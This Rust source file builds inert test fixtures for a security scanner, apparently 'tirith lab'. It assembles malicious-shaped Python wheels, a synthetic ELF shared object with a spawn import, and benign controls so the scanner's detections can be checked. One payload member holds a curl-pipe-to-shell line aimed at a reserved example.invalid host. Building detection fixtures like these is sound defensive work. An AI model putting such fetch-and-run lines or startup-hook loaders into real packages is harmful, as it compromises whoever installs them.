//! Synthetic, inert byte-level artifact fixtures for `tirith lab` (plan unit G2).
//!
//! These materialize malicious-SHAPED wheels (`.pth` startup hooks, native `.so`
//! members, the cross-distribution loader/payload split) and negative controls
//! into a per-run temp directory, so a lab scenario can drive the real artifact
//! inspection pipeline (`tirith_core::artifact::inspect_artifact_set`) over honest
//! bytes. Nothing here is real malware: every network-shaped string targets the
//! reserved `example.invalid` domain, and the native fixtures are hand-rolled ELF
//! object files parsed for static facts only, never loaded.
//!
//! The inert `.pth` member bodies live as reviewable plain text under
//! `assets/lab_artifacts/` and are embedded with `include_str!` (so `cargo
//! package` sees them and the crate stays packageable). The wheel/ELF wrapping is
//! mechanical: the checked-in bytes are the source members; this module zips them.

use std::io::Write as _;
use std::path::{Path, PathBuf};

use base64::Engine as _;
use sha2::{Digest as _, Sha256};
use zip::write::SimpleFileOptions;
use zip::ZipWriter;

// Inert `.pth` source members (see assets/lab_artifacts/README.md). Embedded so
// the fixtures are deterministic and ship with the crate.
const PTH_CROSS_RUNTIME: &str = include_str!("../../assets/lab_artifacts/pth_cross_runtime.pth");
const PTH_SUBPROCESS: &str = include_str!("../../assets/lab_artifacts/pth_subprocess.pth");
const PTH_BENIGN_EDITABLE: &str =
    include_str!("../../assets/lab_artifacts/pth_benign_editable.pth");
const LOADER_CROSS_DIST: &str = include_str!("../../assets/lab_artifacts/loader_cross_dist.pth");

/// A named synthetic artifact fixture. The corpus references these by their
/// `as_str()` token in a scenario's `binary_fixture` field; [`materialize`] writes
/// the bytes into `dir` and returns the artifact paths to inspect (a set, because
/// the cross-distribution case needs two wheels).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ArtifactFixture {
    /// A wheel bundling a `.pth` whose import line launches a cross-runtime (node)
    /// payload via `os.system` (Critical `PythonStartupHookCrossRuntime`).
    PthCrossRuntimeWheel,
    /// A wheel bundling a `.pth` whose import line spawns a subprocess that reaches
    /// a URL (High `PythonStartupHookSuspicious`).
    PthSubprocessWheel,
    /// A wheel bundling a synthetic native `.so` with a constructor section and
    /// loader/spawn capability strings (Critical `NativeImportExecutionChain`).
    NativeChainWheel,
    /// The cross-distribution split: a loader wheel whose `.pth` searches sys.path
    /// and names a payload member owned by a SEPARATE payload wheel. Returns BOTH.
    CrossDistributionSplit,
    /// A benign editable-install wheel (negative control: no finding).
    BenignEditableWheel,
    /// A benign wheel with a pure-Python module only (negative control: no finding).
    BenignPureWheel,
}

impl ArtifactFixture {
    /// Parse the corpus `binary_fixture` token into a fixture, or `None` if unknown
    /// (the caller turns that into a corpus error, never a silent skip).
    pub fn from_token(token: &str) -> Option<Self> {
        Some(match token {
            "pth_cross_runtime_wheel" => Self::PthCrossRuntimeWheel,
            "pth_subprocess_wheel" => Self::PthSubprocessWheel,
            "native_chain_wheel" => Self::NativeChainWheel,
            "cross_distribution_split" => Self::CrossDistributionSplit,
            "benign_editable_wheel" => Self::BenignEditableWheel,
            "benign_pure_wheel" => Self::BenignPureWheel,
            _ => return None,
        })
    }

    /// The stable token used in the corpus `binary_fixture` field.
    pub fn as_str(self) -> &'static str {
        match self {
            Self::PthCrossRuntimeWheel => "pth_cross_runtime_wheel",
            Self::PthSubprocessWheel => "pth_subprocess_wheel",
            Self::NativeChainWheel => "native_chain_wheel",
            Self::CrossDistributionSplit => "cross_distribution_split",
            Self::BenignEditableWheel => "benign_editable_wheel",
            Self::BenignPureWheel => "benign_pure_wheel",
        }
    }

    /// Every fixture token (so a test can assert each is materializable + inert).
    pub fn all() -> &'static [ArtifactFixture] {
        &[
            Self::PthCrossRuntimeWheel,
            Self::PthSubprocessWheel,
            Self::NativeChainWheel,
            Self::CrossDistributionSplit,
            Self::BenignEditableWheel,
            Self::BenignPureWheel,
        ]
    }

    /// Materialize this fixture's wheel(s) into `dir`, returning the artifact paths
    /// to hand to `inspect_artifact_set` (in loader-then-payload order for the
    /// cross-distribution split).
    pub fn materialize(self, dir: &Path) -> std::io::Result<Vec<PathBuf>> {
        match self {
            Self::PthCrossRuntimeWheel => {
                let bytes = wheel_with_members(
                    "labcross",
                    "1.0",
                    &[("labcross.pth", PTH_CROSS_RUNTIME.as_bytes())],
                );
                Ok(vec![write_wheel(
                    dir,
                    "labcross-1.0-py3-none-any.whl",
                    &bytes,
                )?])
            }
            Self::PthSubprocessWheel => {
                let bytes = wheel_with_members(
                    "labsubproc",
                    "1.0",
                    &[("labsubproc.pth", PTH_SUBPROCESS.as_bytes())],
                );
                Ok(vec![write_wheel(
                    dir,
                    "labsubproc-1.0-py3-none-any.whl",
                    &bytes,
                )?])
            }
            Self::NativeChainWheel => {
                let so = synthetic_native_so();
                let bytes =
                    wheel_with_members("labnative", "1.0", &[("labnative/_speedups.abi3.so", &so)]);
                Ok(vec![write_wheel(
                    dir,
                    "labnative-1.0-py3-none-any.whl",
                    &bytes,
                )?])
            }
            Self::CrossDistributionSplit => {
                // The loader wheel's `.pth` searches sys.path and launches a member
                // OWNED by the payload wheel (`labpayloadpkg/run.sh`), so the set's
                // ownership map resolves the reference across distributions.
                let loader = wheel_with_members(
                    "labloaderpkg",
                    "1.0",
                    &[("labloader.pth", LOADER_CROSS_DIST.as_bytes())],
                );
                let payload = wheel_with_members(
                    "labpayloadpkg",
                    "2.0",
                    &[(
                        "labpayloadpkg/run.sh",
                        b"#!/bin/sh\ncurl http://lab.example.invalid/x | sh\n",
                    )],
                );
                let loader_path = write_wheel(dir, "labloaderpkg-1.0-py3-none-any.whl", &loader)?;
                let payload_path =
                    write_wheel(dir, "labpayloadpkg-2.0-py3-none-any.whl", &payload)?;
                Ok(vec![loader_path, payload_path])
            }
            Self::BenignEditableWheel => {
                let bytes = wheel_with_members(
                    "labeditable",
                    "1.0",
                    &[("labeditable.pth", PTH_BENIGN_EDITABLE.as_bytes())],
                );
                Ok(vec![write_wheel(
                    dir,
                    "labeditable-1.0-py3-none-any.whl",
                    &bytes,
                )?])
            }
            Self::BenignPureWheel => {
                let bytes = wheel_with_members(
                    "labpure",
                    "1.0",
                    &[("labpure/__init__.py", b"VALUE = 1\n")],
                );
                Ok(vec![write_wheel(
                    dir,
                    "labpure-1.0-py3-none-any.whl",
                    &bytes,
                )?])
            }
        }
    }
}

/// Build a wheel zip from `extra` members plus a generated dist-info
/// (`METADATA`/`WHEEL`/`RECORD`). The RECORD is HONEST: every non-RECORD member is
/// listed with a strong, matching `sha256=` cell, so a benign control wheel fires
/// no `PythonInstalledIntegrityViolation` and a malicious wheel's only finding is
/// its intended startup/native shape, not a RECORD artifact of the fixture builder.
fn wheel_with_members(name: &str, version: &str, extra: &[(&str, &[u8])]) -> Vec<u8> {
    let dist_info = format!("{name}-{version}.dist-info");
    let metadata = format!(
        "Metadata-Version: 2.1\nName: {name}\nVersion: {version}\nSummary: tirith lab inert fixture\n\n"
    );
    let wheel =
        "Wheel-Version: 1.0\nGenerator: tirith-lab\nRoot-Is-Purelib: true\nTag: py3-none-any\n";

    let metadata_member = format!("{dist_info}/METADATA");
    let wheel_member = format!("{dist_info}/WHEEL");
    let record_member = format!("{dist_info}/RECORD");

    // All non-RECORD members, in zip order (extras first, then METADATA + WHEEL).
    let mut members: Vec<(&str, &[u8])> = Vec::with_capacity(extra.len() + 3);
    members.extend_from_slice(extra);
    members.push((metadata_member.as_str(), metadata.as_bytes()));
    members.push((wheel_member.as_str(), wheel.as_bytes()));

    // Build the honest RECORD: `path,sha256=<b64url-no-pad>,<size>` for each member,
    // then the RECORD line itself (`path,,`).
    let mut record = String::new();
    for (member_name, body) in &members {
        record.push_str(&format!(
            "{member_name},{},{}\n",
            record_sha256_cell(body),
            body.len()
        ));
    }
    record.push_str(&format!("{record_member},,\n"));

    members.push((record_member.as_str(), record.as_bytes()));
    build_zip(&members)
}

/// The RECORD hash cell for a member body: `sha256=<base64url-no-pad>` over the
/// SHA-256 digest (the strong-hash form the wheel RECORD verifier accepts).
fn record_sha256_cell(body: &[u8]) -> String {
    let digest = Sha256::digest(body);
    let b64 = base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(digest);
    format!("sha256={b64}")
}

/// Zip `(member, body)` pairs into an in-memory wheel (the proven `inspect.rs`
/// test-helper shape, lifted to production for the lab).
fn build_zip(members: &[(&str, &[u8])]) -> Vec<u8> {
    let mut zw = ZipWriter::new(std::io::Cursor::new(Vec::new()));
    let opts = SimpleFileOptions::default();
    for (member_name, body) in members {
        // `start_file`/`write_all` on an in-memory cursor do not fail in practice;
        // an error here would be a programming fault, so surface it loudly rather
        // than producing a half-written fixture.
        zw.start_file(*member_name, opts)
            .expect("zip start_file on in-memory cursor");
        zw.write_all(body)
            .expect("zip write_all on in-memory cursor");
    }
    zw.finish()
        .expect("zip finish on in-memory cursor")
        .into_inner()
}

/// Write `bytes` to `dir/name` and return the path. Used for each materialized
/// wheel; the caller owns the temp dir lifetime.
fn write_wheel(dir: &Path, name: &str, bytes: &[u8]) -> std::io::Result<PathBuf> {
    let path = dir.join(name);
    std::fs::write(&path, bytes)?;
    Ok(path)
}

/// Hand-roll a minimal, INERT 64-bit little-endian ELF shared object that the
/// native triage reads as the full execution chain:
///   * a constructor (`.init_array` present) AND a `PyInit_` export -> execution
///     entry,
///   * an UNDEFINED `posix_spawn` dynamic symbol -> a real spawn import (the danger
///     capability + the spawn/loader-import leg),
///   * a `node` runtime name and a `./_run.js` sibling reference in `.rodata` ->
///     corroboration (a real spawn import plus a bare runtime/sibling).
///
/// It is never loaded or executed; `object` parses it for static facts only. The
/// layout mirrors the `build_elf` test helper in `tirith_core::artifact::native`.
fn synthetic_native_so() -> Vec<u8> {
    // (name, defined): a defined PyInit export (execution entry) plus an UNDEFINED
    // `posix_spawn` import. An undefined dynamic symbol (st_shndx == SHN_UNDEF) is
    // how the ELF parser recognizes a spawn/loader import, which a `.rodata` string
    // alone is NOT (strings are deliberately not a danger leg for native modules).
    let symbols: [(&str, bool); 2] = [("PyInit__speedups", true), ("posix_spawn", false)];
    // Corroboration strings: a runtime name + a sibling script reference, plus an
    // inert example.invalid URL. No real host, no real call, no spawn VERB string
    // (the import is the spawn proof; the strings only say what it would launch).
    let rodata = b"node\0./_run.js\0https://lab.example.invalid/payload\0";

    // ---- .dynstr: a NUL byte, then each symbol name NUL-terminated ----
    let mut dynstr: Vec<u8> = vec![0];
    let mut name_offsets: Vec<u32> = Vec::new();
    for (name, _) in symbols {
        name_offsets.push(dynstr.len() as u32);
        dynstr.extend_from_slice(name.as_bytes());
        dynstr.push(0);
    }

    // ---- .dynsym: a null symbol, then one GLOBAL FUNC per name (24 bytes each).
    // A defined symbol uses st_shndx = 1 (any defined section); an import uses
    // st_shndx = 0 (SHN_UNDEF) so `object` reports it as undefined.
    let mut dynsym: Vec<u8> = vec![0u8; 24];
    for (off, (_, defined)) in name_offsets.iter().zip(symbols.iter()) {
        let st_shndx: u16 = if *defined { 1 } else { 0 };
        let mut sym = Vec::new();
        sym.extend_from_slice(&off.to_le_bytes()); // st_name
        sym.push(0x12); // st_info: STB_GLOBAL<<4 | STT_FUNC
        sym.push(0); // st_other
        sym.extend_from_slice(&st_shndx.to_le_bytes()); // st_shndx
        sym.extend_from_slice(&0x1000u64.to_le_bytes()); // st_value
        sym.extend_from_slice(&0u64.to_le_bytes()); // st_size
        dynsym.extend_from_slice(&sym);
    }

    // ---- .init_array: one relative pointer slot (the constructor) ----
    let init_array: Vec<u8> = 0x1234u64.to_le_bytes().to_vec();

    // ---- .shstrtab: section-name string table ----
    let mut shstrtab: Vec<u8> = vec![0];
    let mut sh_name = |s: &str| -> u32 {
        let off = shstrtab.len() as u32;
        shstrtab.extend_from_slice(s.as_bytes());
        shstrtab.push(0);
        off
    };
    let n_dynsym = sh_name(".dynsym");
    let n_dynstr = sh_name(".dynstr");
    let n_init = sh_name(".init_array");
    let n_rodata = sh_name(".rodata");
    let n_shstrtab = sh_name(".shstrtab");

    // ---- Lay out section DATA after the 64-byte ELF header ----
    let ehsize = 64u64;
    let mut cursor = ehsize;
    let off_dynsym = cursor;
    cursor += dynsym.len() as u64;
    let off_dynstr = cursor;
    cursor += dynstr.len() as u64;
    let off_init = cursor;
    cursor += init_array.len() as u64;
    let off_rodata = cursor;
    cursor += rodata.len() as u64;
    let off_shstrtab = cursor;
    cursor += shstrtab.len() as u64;
    let shoff = (cursor + 7) & !7;

    // Section headers: [name, type, flags, addr, offset, size, link, entsize/info].
    // [0]=NULL [1]=.dynsym [2]=.dynstr [3]=.init_array [4]=.rodata [5]=.shstrtab.
    let dynstr_index = 2u64;
    let sections: [[u64; 8]; 6] = [
        [0, 0, 0, 0, 0, 0, 0, 0],
        [
            n_dynsym as u64,
            11, // SHT_DYNSYM
            0,
            0,
            off_dynsym,
            dynsym.len() as u64,
            dynstr_index, // link → .dynstr
            24,           // entsize
        ],
        [
            n_dynstr as u64,
            3, // SHT_STRTAB
            0,
            0,
            off_dynstr,
            dynstr.len() as u64,
            0,
            0,
        ],
        [
            n_init as u64,
            14, // SHT_INIT_ARRAY
            0,
            0,
            off_init,
            init_array.len() as u64,
            0,
            8,
        ],
        [
            n_rodata as u64,
            1, // SHT_PROGBITS
            0,
            0,
            off_rodata,
            rodata.len() as u64,
            0,
            0,
        ],
        [
            n_shstrtab as u64,
            3, // SHT_STRTAB
            0,
            0,
            off_shstrtab,
            shstrtab.len() as u64,
            0,
            0,
        ],
    ];

    // ---- ELF header (Elf64_Ehdr, 64 bytes) ----
    let mut elf: Vec<u8> = Vec::new();
    elf.extend_from_slice(&[0x7f, b'E', b'L', b'F']); // EI_MAG
    elf.push(2); // EI_CLASS = ELFCLASS64
    elf.push(1); // EI_DATA = ELFDATA2LSB
    elf.push(1); // EI_VERSION
    elf.push(0); // EI_OSABI
    elf.extend_from_slice(&[0u8; 8]); // EI_PAD
    elf.extend_from_slice(&3u16.to_le_bytes()); // e_type = ET_DYN (shared object)
    elf.extend_from_slice(&0x3eu16.to_le_bytes()); // e_machine = x86-64
    elf.extend_from_slice(&1u32.to_le_bytes()); // e_version
    elf.extend_from_slice(&0u64.to_le_bytes()); // e_entry
    elf.extend_from_slice(&0u64.to_le_bytes()); // e_phoff
    elf.extend_from_slice(&shoff.to_le_bytes()); // e_shoff
    elf.extend_from_slice(&0u32.to_le_bytes()); // e_flags
    elf.extend_from_slice(&64u16.to_le_bytes()); // e_ehsize
    elf.extend_from_slice(&0u16.to_le_bytes()); // e_phentsize
    elf.extend_from_slice(&0u16.to_le_bytes()); // e_phnum
    elf.extend_from_slice(&64u16.to_le_bytes()); // e_shentsize (Elf64_Shdr)
    elf.extend_from_slice(&(sections.len() as u16).to_le_bytes()); // e_shnum
    elf.extend_from_slice(&5u16.to_le_bytes()); // e_shstrndx → .shstrtab

    // ---- Section data, in the order the offsets were assigned ----
    elf.extend_from_slice(&dynsym);
    elf.extend_from_slice(&dynstr);
    elf.extend_from_slice(&init_array);
    elf.extend_from_slice(rodata);
    elf.extend_from_slice(&shstrtab);
    while (elf.len() as u64) < shoff {
        elf.push(0);
    }

    // ---- Section header table (Elf64_Shdr = 64 bytes each) ----
    for s in &sections {
        elf.extend_from_slice(&(s[0] as u32).to_le_bytes()); // sh_name
        elf.extend_from_slice(&(s[1] as u32).to_le_bytes()); // sh_type
        elf.extend_from_slice(&s[2].to_le_bytes()); // sh_flags
        elf.extend_from_slice(&s[3].to_le_bytes()); // sh_addr
        elf.extend_from_slice(&s[4].to_le_bytes()); // sh_offset
        elf.extend_from_slice(&s[5].to_le_bytes()); // sh_size
        elf.extend_from_slice(&(s[6] as u32).to_le_bytes()); // sh_link
        elf.extend_from_slice(&(s[6] as u32).to_le_bytes()); // sh_info (reuse link/info slot)
        elf.extend_from_slice(&8u64.to_le_bytes()); // sh_addralign
        elf.extend_from_slice(&s[7].to_le_bytes()); // sh_entsize
    }

    elf
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_fixture_token_round_trips() {
        for f in ArtifactFixture::all() {
            let token = f.as_str();
            assert_eq!(
                ArtifactFixture::from_token(token),
                Some(*f),
                "token {token} must round-trip"
            );
        }
        assert_eq!(ArtifactFixture::from_token("nope"), None);
    }

    #[test]
    fn every_fixture_materializes_to_existing_wheels() {
        let dir = tempfile::tempdir().unwrap();
        for f in ArtifactFixture::all() {
            let sub = dir.path().join(f.as_str());
            std::fs::create_dir_all(&sub).unwrap();
            let paths = f.materialize(&sub).unwrap();
            assert!(!paths.is_empty(), "{} produced no artifact", f.as_str());
            for p in &paths {
                assert!(p.exists(), "{} did not write {}", f.as_str(), p.display());
                assert!(
                    p.extension().and_then(|e| e.to_str()) == Some("whl"),
                    "{} produced a non-wheel path {}",
                    f.as_str(),
                    p.display()
                );
            }
        }
        // The cross-distribution split is the only multi-artifact fixture.
        let sub = dir.path().join("xd");
        std::fs::create_dir_all(&sub).unwrap();
        assert_eq!(
            ArtifactFixture::CrossDistributionSplit
                .materialize(&sub)
                .unwrap()
                .len(),
            2
        );
    }

    #[test]
    fn fixtures_are_inert_no_routable_host() {
        // No fixture may embed a routable host: every network-shaped string uses
        // the reserved example.invalid domain (RFC 6761) or no host at all.
        let dir = tempfile::tempdir().unwrap();
        for f in ArtifactFixture::all() {
            let sub = dir.path().join(f.as_str());
            std::fs::create_dir_all(&sub).unwrap();
            for path in f.materialize(&sub).unwrap() {
                let bytes = std::fs::read(&path).unwrap();
                // Scan the raw (compressed) wheel AND the decompressed members for
                // any obvious live-host scheme. The members are tiny + stored, but
                // assert on the source strings directly too.
                let haystack = String::from_utf8_lossy(&bytes);
                for needle in ["http://evil", "https://evil", ".com/", ".net/", ".org/"] {
                    assert!(
                        !haystack.contains(needle),
                        "{} fixture leaked a live-looking host substring {:?}",
                        f.as_str(),
                        needle
                    );
                }
            }
        }
    }

    #[test]
    fn native_so_is_a_parseable_elf() {
        let so = synthetic_native_so();
        assert_eq!(&so[..4], &[0x7f, b'E', b'L', b'F'], "ELF magic present");
        let s = String::from_utf8_lossy(&so);
        // The dynamic-symbol names (PyInit export + posix_spawn import) live in
        // .dynstr; the corroboration strings live in .rodata.
        assert!(s.contains("PyInit__speedups"), "PyInit export present");
        assert!(s.contains("posix_spawn"), "spawn import symbol present");
        assert!(s.contains("node"), "runtime corroboration string present");
        assert!(
            s.contains("example.invalid"),
            "inert example.invalid URL present, not a live host"
        );
    }

    #[test]
    fn native_so_triages_to_the_execution_chain() {
        // The synthetic .so must satisfy the full native conjunction so the
        // native_chain_wheel fixture blocks: object parses it, sees the PyInit
        // export + undefined posix_spawn import + the runtime/sibling corroboration.
        use tirith_core::artifact::native::triage_native;
        use tirith_core::location::SubjectLocation;
        let so = synthetic_native_so();
        // Build the buffered handoff the archive reader would emit for this member.
        let handoff = tirith_core::artifact::archive::NativeMemberHandoff::Buffered {
            location: SubjectLocation::member(
                "labnative-1.0-py3-none-any.whl",
                "labnative/_speedups.abi3.so",
            ),
            sha256: String::new(),
            bytes: so,
        };
        let triage = triage_native(&handoff, false, false);
        assert!(
            triage.finding.is_some(),
            "synthetic .so must trip the Critical native chain; facts: {:?}",
            triage.facts
        );
    }
}
